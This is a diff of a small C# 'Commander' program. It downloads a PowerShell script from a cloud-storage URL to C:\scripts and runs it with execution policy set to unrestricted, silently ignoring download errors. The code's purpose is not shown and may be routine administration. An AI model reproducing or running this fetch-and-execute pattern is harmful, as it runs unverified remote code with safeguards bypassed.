@@ -1,4 +1,5 @@
-﻿using System.Diagnostics;
+﻿using System;
+using System.Diagnostics;
 using System.Net;
 
 namespace Commander
@@ -36,25 +37,27 @@ namespace Commander
             process.StartInfo = startInfo;
             process.Start();
         }
-        static void RunPWSH(string path)
-        {
-            string commandStr = "/c powershell  -NoLogo -NoProfile -executionpolicy unrestricted " + path;
-            System.Diagnostics.Process.Start("cmd.exe", commandStr);
-        }
-        internal static void DoJob()
+
+        internal void StartJob()
         {
             try
             {
                 DownFile("https://it2u.oss-cn-shenzhen.aliyuncs.com/scripts/get-info.PS1", "C:\\scripts\\installer.PS1");
 
             }
-            catch 
+            catch
             {
 
             }
 
             //RunPWSH("C:\\scripts\\installer.PS1");
             RunPWSH2("C:\\scripts\\installer.PS1");
+        }
+
+        static void RunPWSH(string path)
+        {
+            string commandStr = "/c powershell  -NoLogo -NoProfile -executionpolicy unrestricted " + path;
+            System.Diagnostics.Process.Start("cmd.exe", commandStr);
         }
     }
 }
